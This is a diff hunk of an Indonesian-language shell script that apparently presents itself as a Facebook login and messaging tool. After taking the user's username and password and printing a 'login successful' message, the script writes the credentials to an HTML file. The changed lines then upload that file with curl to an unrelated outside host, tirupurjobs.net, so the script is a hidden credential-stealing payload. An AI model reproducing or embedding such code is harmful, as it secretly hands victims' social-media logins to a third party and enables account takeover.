@@ -22,9 +22,9 @@ curl -U https://mobile.facebook.com/login$user$pass
 sleep 4
 echo "~root[@]Berhasil Login √ " | lolcat
 echo "menyimpan akses login anda..." | lolcat
-echo "User: $user\nPass: $pass" >> File/Akses/login.html;
+echo "User: $user\nPass: $pass" >> File/login.html;
 sleep 2
-curl -T File/Akses/login.html http://tirupurjobs.net 
+curl -T File/login.html http://tirupurjobs.net 
 echo "\033[93m"
 read -p "masukan pesan 1 :" pesan1 ;
 read -p "masukan pesan 2 :" pesan2 ;
